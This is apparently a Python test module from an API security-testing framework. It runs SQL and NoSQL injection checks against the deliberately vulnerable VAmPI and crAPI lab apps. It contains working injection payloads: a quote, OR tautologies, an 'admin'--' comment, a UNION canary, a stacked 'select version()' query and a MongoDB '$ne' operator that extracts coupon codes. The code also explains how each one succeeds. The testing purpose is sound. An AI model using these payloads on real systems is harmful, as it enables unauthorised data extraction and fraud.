"""
SQL/NoSQL injection tests.

VAmPI: `SQLiUserLookupTest` reseeds via /createdb at the start of run().

crAPI: `NoSQLiCouponValidateTest` and `SQLiApplyCouponTest` run signs up
a fresh synthetic identity (no reseeding).

`SQLiApplyCouponTest`'s sub-test adds one row to crAPI's `applied_coupon`
table per run as a setup step.
"""

from __future__ import annotations

import logging
import random
import urllib.parse
import uuid
from typing import Any, Optional

import requests

from src.utils.crapi_client import CrAPIClient
from src.utils.results_logger import RunLogger
from src.utils.vampi_client import VAmPIClient
from src.vulnerabilities.base import Severity, VulnerabilityResult, VulnerabilityTest

logger = logging.getLogger(__name__)

# VAmPI's own fixture accounts, created by models/user_model.py::init_db_users()
# on every /createdb reseed — independent of this framework's synthetic
# alice/bob test_users.
SEEDED_USERNAMES = {"name1", "name2", "admin"}

SQL_ERROR_SIGNATURES = ("sqlite3", "operationalerror", "syntax error", "sqlalchemy")


class SQLiUserLookupTest(VulnerabilityTest):
    """
    Confirms SQL injection in VAmPI's `GET /users/v1/{username}` lookup.
    """

    name = "sqli_user_lookup"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: VAmPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payloads: list[str] = client.scan_config.get("sqli_payloads", [])

    def run(self) -> list[VulnerabilityResult]:
        self.client.seed_database()
        self.client.register("attacker")
        self.client.login("attacker")

        results = [self._test_control_nonexistent_user()]

        for payload in self.payloads:
            if payload == "'":
                results.append(self._test_error_based(payload))
            elif payload == "admin'--":
                results.append(self._test_admin_extraction(payload))
            elif "{canary}" in payload:
                results.append(self._test_union_canary(payload))
            else:
                results.append(self._test_boolean_based(payload, as_user=None))

        # Auth doesn't gate this endpoint at all per the OpenAPI spec (no
        # `security:` block) — repeat one tautology payload with a valid
        # token attached to confirm a token provides no compensating control.
        tautology_payloads = [p for p in self.payloads if p.startswith("' OR")]
        if tautology_payloads:
            results.append(
                self._test_boolean_based(tautology_payloads[0], as_user="attacker")
            )

        return results

    # -- request plumbing ------------------------------------------------

    def _path_for(self, raw_value: str) -> str:
        """Percent-encode the payload as a single path segment ourselves."""
        template = self.client.endpoints.get("sqli_target", "/users/v1/{username}")
        encoded = urllib.parse.quote(raw_value, safe="")
        return template.format(username=encoded)

    def _safe_get(
        self, path: str, as_user: Optional[str] = None
    ) -> Optional[requests.Response]:
        """GET the path, treating transport-level failures as a signal."""
        try:
            return self.client.get(path, as_user=as_user)
        except requests.exceptions.RequestException as exc:
            logger.warning("Request to %s failed at the transport level: %s", path, exc)
            return None

    @staticmethod
    def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
        try:
            return resp.json()
        except ValueError:
            return None

    # -- individual checks -------------------------------------------------

    def _test_control_nonexistent_user(self) -> VulnerabilityResult:
        """Baseline: a genuinely nonexistent, non-malicious username must 404."""
        control_username = f"nonexistent_{uuid.uuid4().hex[:10]}"
        path = self._path_for(control_username)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=(
                    "Control request (benign, nonexistent username) failed at "
                    "the transport level — inconclusive, not itself a finding."
                ),
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
            )

        unexpected_match = resp.status_code == 200
        return self._result(
            passed=not unexpected_match,
            severity=Severity.MEDIUM if unexpected_match else Severity.LOW,
            evidence=(
                f"Control username '{control_username}' returned HTTP {resp.status_code} "
                f"({'unexpectedly matched a real user — baseline is unreliable' if unexpected_match else 'not found, as expected'})."
            ),
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_error_based(self, payload: str) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=False,
                severity=Severity.CRITICAL,
                evidence=(
                    f"Payload {payload!r} caused the request to fail at the transport "
                    "level (e.g. connection reset) rather than returning a clean "
                    "response — consistent with the malformed literal crashing the "
                    "raw SQL execution. Lower-confidence than a clean 500 with a "
                    "traceback, but still evidence of injection; see module docstring."
                ),
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        body_lower = resp.text.lower()
        error_signature = next(
            (sig for sig in SQL_ERROR_SIGNATURES if sig in body_lower), None
        )
        confirmed = resp.status_code >= 500 or error_signature is not None

        evidence = f"Payload {payload!r} -> HTTP {resp.status_code}."
        if error_signature:
            evidence += (
                f" Response body contains SQL error signature '{error_signature}'."
            )
        if confirmed:
            evidence += " Confirms error-based SQL injection (raw query broke on the unescaped quote)."

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_boolean_based(
        self, payload: str, as_user: Optional[str]
    ) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path, as_user=as_user)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} (as_user={as_user!r}) failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user={as_user!r}",
                response_summary="connection failed",
                payload=payload,
            )

        returned_username = None
        confirmed = False
        if resp.status_code == 200:
            body = self._parse_json(resp)
            if body:
                returned_username = body.get("username")
                confirmed = returned_username in SEEDED_USERNAMES

        evidence = (
            f"Payload {payload!r} (as_user={as_user!r}) -> HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                f" Returned seeded account '{returned_username}' despite the "
                "requested literal username not existing — the OR tautology "
                "matched an arbitrary row, confirming boolean-based SQLi."
            )
            if as_user:
                evidence += " A valid auth token was attached and did not prevent this."

        return self._result(
            passed=not confirmed,
            severity=Severity.HIGH if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user={as_user!r}",
            response_summary=f"HTTP {resp.status_code}; returned_username={returned_username!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_admin_extraction(self, payload: str) -> VulnerabilityResult:
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        returned_username = None
        confirmed = False
        if resp.status_code == 200:
            body = self._parse_json(resp)
            if body:
                returned_username = body.get("username")
                confirmed = returned_username == "admin"

        evidence = f"Payload {payload!r} -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                " Returned the admin account's own data despite the requested "
                "literal string not being a real username — the trailing quote "
                "was consumed as a SQL comment, confirming targeted comment-based "
                "extraction of a specific (privileged) account."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}; returned_username={returned_username!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _test_union_canary(self, payload_template: str) -> VulnerabilityResult:
        canary = f"sqlicanary{uuid.uuid4().hex[:12]}"
        payload = payload_template.format(canary=canary)
        path = self._path_for(payload)
        resp = self._safe_get(path)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence="UNION canary payload failed at the transport level — inconclusive.",
                request_summary=f"GET {path} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        confirmed = resp.status_code == 200 and canary in resp.text

        evidence = f"UNION canary payload -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                f" Random per-run canary '{canary}' was reflected verbatim in the "
                "response body (substring match — it lands inside a JSON field, "
                "not as the whole body), proving full attacker control over "
                "returned row data via UNION SELECT (e.g. could extract the "
                "password column instead)."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} as_user=None",
            response_summary=f"HTTP {resp.status_code}; canary_reflected={confirmed}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )


def _fresh_synthetic_login(client: CrAPIClient, role: str) -> None:
    """Sign up and log in a brand-new synthetic identity for `role`.

    crAPI enforces unique email *and* phone number per account and has no
    reseed endpoint (see module docstring), so each test run needs its own
    fresh identity rather than reusing config's static test_users values,
    which would 403 ("already registered") on a second run.
    """
    user = client.test_users[role]
    suffix = uuid.uuid4().hex[:10]
    user["email"] = f"{role}.{suffix}@crapi-test.local"
    user["number"] = str(random.randint(6_000_000_000, 6_999_999_999))
    client.signup(role)
    client.login(role)


class NoSQLiCouponValidateTest(VulnerabilityTest):
    """
    Confirms NoSQL injection in crAPI's
    `POST /community/api/v2/coupon/validate-coupon`.

    crapi-community unmarshals the raw request body directly into a MongoDB
    bson.M filter with no shape validation, so a Mongo query operator in
    the request body (e.g. {"coupon_code": {"$ne": 1}}) is honoured as
    query logic instead of a literal value — crAPI's own documented
    "Challenge 12": a free coupon without ever knowing a real coupon code.

    Mapped to "API8:2023 Security Misconfiguration" (Injection has no
    dedicated OWASP API category), matching the mapping used for VAmPI's
    SQLiUserLookupTest so injection findings stay comparable across REST
    targets (ProposalReport.docx §3.4).
    """

    name = "nosqli_coupon_validate"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: CrAPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payloads: list[Any] = client.scan_config.get("nosql_coupon_payloads", [])

    def run(self) -> list[VulnerabilityResult]:
        _fresh_synthetic_login(self.client, "attacker")

        results = [
            self._test_control_nonexistent_code(),
            self._test_unauthenticated_rejected(),
        ]
        for payload in self.payloads:
            results.append(self._test_operator_payload(payload))
        return results

    # -- request plumbing ------------------------------------------------

    def _safe_validate(
        self, body: dict[str, Any], as_user: Optional[str]
    ) -> Optional[requests.Response]:
        try:
            return self.client.validate_coupon(body, as_user=as_user)
        except requests.exceptions.RequestException as exc:
            logger.warning(
                "validate-coupon request failed at the transport level: %s", exc
            )
            return None

    @staticmethod
    def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
        try:
            return resp.json()
        except ValueError:
            return None

    # -- individual checks -------------------------------------------------

    def _test_control_nonexistent_code(self) -> VulnerabilityResult:
        """Baseline: a genuinely nonexistent, literal coupon_code must not match."""
        control_code = f"nonexistent_{uuid.uuid4().hex[:10]}"
        body = {"coupon_code": control_code}
        resp = self._safe_validate(body, as_user="attacker")

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=(
                    "Control request (benign, nonexistent coupon_code) failed at "
                    "the transport level — inconclusive, not itself a finding."
                ),
                request_summary=f"POST validate-coupon {body!r} as_user='attacker'",
                response_summary="connection failed",
            )

        unexpected_match = resp.status_code == 200
        return self._result(
            passed=not unexpected_match,
            severity=Severity.MEDIUM if unexpected_match else Severity.LOW,
            evidence=(
                f"Control coupon_code {control_code!r} -> HTTP {resp.status_code} "
                f"({'unexpectedly matched a real coupon — baseline is unreliable' if unexpected_match else 'no match, as expected (Mongo ErrNoDocuments)'})."
            ),
            request_summary=f"POST validate-coupon {body!r} as_user='attacker'",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_unauthenticated_rejected(self) -> VulnerabilityResult:
        """Extra retest: confirms whether auth is required at all before
        drawing conclusions about it being (or not being) a compensating
        control against the injection — see _test_operator_payload.
        """
        payload = self.payloads[0] if self.payloads else {"$ne": 1}
        body = {"coupon_code": payload}
        resp = self._safe_validate(body, as_user=None)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence="Unauthenticated request failed at the transport level — inconclusive.",
                request_summary=f"POST validate-coupon {body!r} as_user=None",
                response_summary="connection failed",
            )

        rejected = resp.status_code == 401
        evidence = f"Unauthenticated injection attempt -> HTTP {resp.status_code}."
        if rejected:
            evidence += (
                " Rejected, as expected — unlike VAmPI's sqli_target, this endpoint does "
                "enforce authentication. See the authenticated payload results for "
                "confirmation that a valid token is not, however, a compensating control "
                "against the injection itself: any registered user's token is sufficient, "
                "since coupons have no per-user ownership concept at all."
            )
        else:
            evidence += (
                " NOT rejected — this endpoint has no authentication check at all."
            )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.HIGH,
            evidence=evidence,
            request_summary=f"POST validate-coupon {body!r} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_operator_payload(self, payload: Any) -> VulnerabilityResult:
        body = {"coupon_code": payload}
        resp = self._safe_validate(body, as_user="attacker")

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} failed at the transport level — inconclusive.",
                request_summary=f"POST validate-coupon {body!r} as_user='attacker'",
                response_summary="connection failed",
                payload=str(payload),
            )

        leaked_code = None
        leaked_amount = None
        confirmed = False
        if resp.status_code == 200:
            data = self._parse_json(resp)
            if data:
                leaked_code = data.get("coupon_code")
                leaked_amount = data.get("amount")
                confirmed = bool(leaked_code)

        evidence = (
            f"Payload {{'coupon_code': {payload!r}}} (authenticated as an ordinary, "
            f"non-privileged registered user) -> HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                f" Returned real coupon {leaked_code!r} (amount={leaked_amount!r}) despite "
                "the request never containing a literal matching value — the request body is "
                "passed unmodified as a MongoDB filter (bson.M) straight into FindOne(), so "
                "the Mongo operator in the payload is honoured as query logic rather than "
                "treated as data. Confirms free coupon discovery without knowing any real "
                "code (crAPI's own 'Challenge 12')."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"POST validate-coupon {body!r} as_user='attacker'",
            response_summary=f"HTTP {resp.status_code}; leaked_coupon_code={leaked_code!r}",
            payload=str(payload),
            cwe="CWE-943",
            owasp_top10_web="A03:2021 Injection",
        )


class SQLiApplyCouponTest(VulnerabilityTest):
    """
    Confirms SQL injection in crAPI's `POST /workshop/api/shop/apply_coupon`.

    crapi-workshop string-concatenates coupon_code directly into a raw SQL
    query with no parameterisation, run unconditionally on every call
    before any coupon-existence check. A stacked-query payload
    (`0'; select version() --+`) leaks a PostgreSQL version banner into the
    response on a fresh container. A boolean tautology payload
    (`0' or '0' = '0`) matches every row in the applied_coupon table
    instead of being scoped to the caller's own rows; the tautology
    sub-test applies one real coupon as setup so a matching row exists,
    which permanently adds a row to that table on every run since crAPI
    has no reset endpoint.

    Mapped to "API8:2023 Security Misconfiguration", same rationale as
    NoSQLiCouponValidateTest.
    """

    name = "sqli_apply_coupon"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: CrAPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.payloads: list[str] = client.scan_config.get("sqli_coupon_payloads", [])

    def run(self) -> list[VulnerabilityResult]:
        _fresh_synthetic_login(self.client, "attacker")

        results = [self._test_control_nonexistent_code()]

        for payload in self.payloads:
            if "select version" in payload.lower():
                results.append(self._test_unauthenticated_rejected(payload))
                results.append(self._test_stacked_query(payload))
            else:
                results.append(self._test_tautology(payload))

        return results

    # -- request plumbing ------------------------------------------------

    def _safe_apply(
        self, coupon_code: str, amount: int, as_user: Optional[str]
    ) -> Optional[requests.Response]:
        try:
            return self.client.apply_coupon(coupon_code, amount, as_user=as_user)
        except requests.exceptions.RequestException as exc:
            logger.warning(
                "apply_coupon request failed at the transport level: %s", exc
            )
            return None

    @staticmethod
    def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
        try:
            return resp.json()
        except ValueError:
            return None

    # -- individual checks -------------------------------------------------

    def _test_control_nonexistent_code(self) -> VulnerabilityResult:
        control_code = f"nonexistent_{uuid.uuid4().hex[:10]}"
        resp = self._safe_apply(control_code, 0, as_user="attacker")

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=(
                    "Control request (benign, nonexistent coupon_code) failed at "
                    "the transport level — inconclusive."
                ),
                request_summary=f"POST apply_coupon coupon_code={control_code!r} as_user='attacker'",
                response_summary="connection failed",
            )

        data = self._parse_json(resp) or {}
        message = str(data.get("message", ""))
        message_lower = message.lower()
        error_signature = "postgresql" in message_lower or any(
            sig in message_lower for sig in SQL_ERROR_SIGNATURES
        )

        return self._result(
            passed=not error_signature,
            severity=Severity.MEDIUM if error_signature else Severity.LOW,
            evidence=(
                f"Control coupon_code {control_code!r} -> HTTP {resp.status_code}, "
                f"message={message!r} "
                f"({'unexpected SQL/DB error signature in a syntactically safe control — baseline unreliable' if error_signature else 'clean not-found response, as expected'})."
            ),
            request_summary=f"POST apply_coupon coupon_code={control_code!r} as_user='attacker'",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_unauthenticated_rejected(self, payload: str) -> VulnerabilityResult:
        resp = self._safe_apply(payload, 0, as_user=None)

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence="Unauthenticated request failed at the transport level — inconclusive.",
                request_summary=f"POST apply_coupon coupon_code={payload!r} as_user=None",
                response_summary="connection failed",
                payload=payload,
            )

        rejected = resp.status_code == 401
        evidence = f"Unauthenticated injection attempt -> HTTP {resp.status_code}."
        if rejected:
            evidence += (
                " Rejected, as expected — this endpoint does enforce authentication. See the "
                "authenticated payload result for confirmation that a valid token is not, "
                "however, a compensating control against the injection itself: any registered "
                "user's own token is sufficient, since the vulnerable query is only ever scoped "
                "to that token's own user_id, not gated by any coupon-ownership check."
            )
        else:
            evidence += (
                " NOT rejected — this endpoint has no authentication check at all."
            )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.HIGH,
            evidence=evidence,
            request_summary=f"POST apply_coupon coupon_code={payload!r} as_user=None",
            response_summary=f"HTTP {resp.status_code}",
            payload=payload,
        )

    def _test_stacked_query(self, payload: str) -> VulnerabilityResult:
        resp = self._safe_apply(payload, 0, as_user="attacker")

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Payload {payload!r} failed at the transport level — inconclusive.",
                request_summary=f"POST apply_coupon coupon_code={payload!r} as_user='attacker'",
                response_summary="connection failed",
                payload=payload,
            )

        data = self._parse_json(resp) or {}
        message = str(data.get("message", ""))
        confirmed = "postgresql" in message.lower()

        evidence = (
            f"Payload {payload!r} -> HTTP {resp.status_code}, message={message!r}."
        )
        if confirmed:
            evidence += (
                " Message contains a PostgreSQL version banner — the raw query executed as two "
                "stacked statements (the simple query protocol only returns the last statement's "
                "result set), so select version()'s output landed in the row the view code "
                "treats as an already-claimed coupon_code and echoed it back verbatim. Confirms "
                "stacked-query execution and DB version disclosure; no pre-existing "
                "applied_coupon rows were required."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"POST apply_coupon coupon_code={payload!r} as_user='attacker'",
            response_summary=f"HTTP {resp.status_code}; message={message!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )

    def _discover_and_apply_real_coupon(self) -> Optional[str]:
        """Setup step for _test_tautology.

        Discovers a currently-valid coupon code via the same $ne operator
        NoSQLiCouponValidateTest uses, then applies it to the attacker
        account so a row exists in applied_coupon for the tautology
        payload to match. Returns the applied coupon_code, or None if
        discovery/application failed (the tautology test is then skipped
        as inconclusive).
        """
        try:
            discover_resp = self.client.validate_coupon(
                {"coupon_code": {"$ne": 1}}, as_user="attacker"
            )
        except requests.exceptions.RequestException as exc:
            logger.warning("Coupon discovery failed at the transport level: %s", exc)
            return None

        if discover_resp.status_code != 200:
            return None
        data = self._parse_json(discover_resp) or {}
        coupon_code = data.get("coupon_code")
        amount = data.get("amount")
        if not coupon_code or amount is None:
            return None

        try:
            apply_resp = self.client.apply_coupon(
                coupon_code, int(amount), as_user="attacker"
            )
        except (requests.exceptions.RequestException, ValueError) as exc:
            logger.warning("Setup apply_coupon failed: %s", exc)
            return None

        if apply_resp.status_code != 200:
            return None
        return coupon_code

    def _test_tautology(self, payload: str) -> VulnerabilityResult:
        applied_code = self._discover_and_apply_real_coupon()
        if applied_code is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=(
                    "Setup for the tautology test (discover a valid coupon via the $ne "
                    "operator, then legitimately apply it) failed — inconclusive, not "
                    "itself a finding. See _test_stacked_query for a setup-free "
                    "confirmation of the same injection point."
                ),
                request_summary="POST apply_coupon (setup phase)",
                response_summary="setup failed",
                payload=payload,
            )

        resp = self._safe_apply(payload, 0, as_user="attacker")

        if resp is None:
            return self._result(
                passed=True,
                severity=Severity.LOW,
                evidence=f"Tautology payload {payload!r} failed at the transport level — inconclusive.",
                request_summary=f"POST apply_coupon coupon_code={payload!r} as_user='attacker'",
                response_summary="connection failed",
                payload=payload,
            )

        data = self._parse_json(resp) or {}
        message = str(data.get("message", ""))
        # Confirmed if the "already claimed" response names the coupon
        # applied in setup, even though `payload` — a different, literally
        # non-matching string — is what was actually sent as coupon_code.
        confirmed = (
            resp.status_code == 400
            and applied_code in message
            and payload not in message
        )

        evidence = f"Tautology payload {payload!r} -> HTTP {resp.status_code}, message={message!r}."
        if confirmed:
            evidence += (
                f" Response names coupon {applied_code!r} (legitimately applied in this "
                f"test's own setup step) as 'already claimed', despite {payload!r} — a "
                "different, non-matching literal — being what was actually sent. AND binds "
                "tighter than OR, so the WHERE clause matched an arbitrary row in the whole "
                "applied_coupon table rather than being scoped to the intended literal "
                "value, confirming boolean-based SQL injection."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.HIGH if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"POST apply_coupon coupon_code={payload!r} as_user='attacker'",
            response_summary=f"HTTP {resp.status_code}; message={message!r}",
            payload=payload,
            cwe="CWE-89",
            owasp_top10_web="A03:2021 Injection",
        )


def _print_results(results: list[VulnerabilityResult]) -> None:
    for result in results:
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()


def _run_vampi() -> None:
    vampi_client = VAmPIClient.from_config("config/vampi.yaml")
    with RunLogger("rest", "vampi", "config/vampi.yaml") as run:
        vampi_results = SQLiUserLookupTest(
            architecture="rest", target="vampi", client=vampi_client
        ).run()
        run.log_results(vampi_results)
    _print_results(vampi_results)


def _run_crapi() -> None:
    crapi_client = CrAPIClient.from_config("config/crapi.yaml")
    with RunLogger("rest", "crapi", "config/crapi.yaml") as run:
        nosqli_results = NoSQLiCouponValidateTest(
            architecture="rest", target="crapi", client=crapi_client
        ).run()
        run.log_results(nosqli_results)
        sqli_results = SQLiApplyCouponTest(
            architecture="rest", target="crapi", client=crapi_client
        ).run()
        run.log_results(sqli_results)
    _print_results(nosqli_results)
    _print_results(sqli_results)


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--target",
        choices=["vampi", "crapi", "all"],
        default="all",
        help=(
            "Which target's containers must be up. Default 'all' matches this "
            "script's previous behaviour, but requires both docker-compose.vampi.yml "
            "and docker-compose.crapi.yml to be running — pass --target to run just one."
        ),
    )
    args = parser.parse_args()

    if args.target in ("vampi", "all"):
        _run_vampi()
    if args.target in ("crapi", "all"):
        _run_crapi()
